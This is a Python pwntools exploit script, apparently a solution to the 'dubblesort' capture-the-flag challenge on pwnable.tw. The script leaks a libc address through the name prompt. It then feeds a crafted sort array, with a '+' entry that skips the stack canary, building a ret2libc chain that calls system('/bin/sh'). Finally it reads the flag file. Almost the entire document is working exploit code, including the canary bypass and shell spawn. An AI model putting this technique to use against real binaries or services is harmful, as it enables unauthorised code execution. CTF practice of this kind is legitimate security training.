#!/usr/bin/env python3
from pwn import *

PORT = 10101
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./dubblesort_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x00000A32
            brva 0x00000AB3
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# Leak libc

p.sendlineafter(b"What your name :", b'A' * 28)
p.recvuntil(b'A' * 28 + b'\n')
libc_leak = u32(b'\x00' + p.recvn(3))
libc_base = libc_leak - 0x1b0000
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc_base))

# ROP

system = libc_base + 0x3a940
bin_sh = libc_base + 0x158e8b

pl = []
pl += [0]*24
pl += [None]
pl += [system]*9
pl += [bin_sh]

p.sendlineafter(
    b'what to sort :',
    str(len(pl)).encode()
)

for i, x in enumerate(pl):
    prompt = f'Enter the {i} number : '.encode()

    if x is None:
        data = b'+'
    else:
        data = str(x).encode()
    p.sendlineafter(prompt, data)

p.sendline("cat /home/dubblesort/flag")

p.interactive()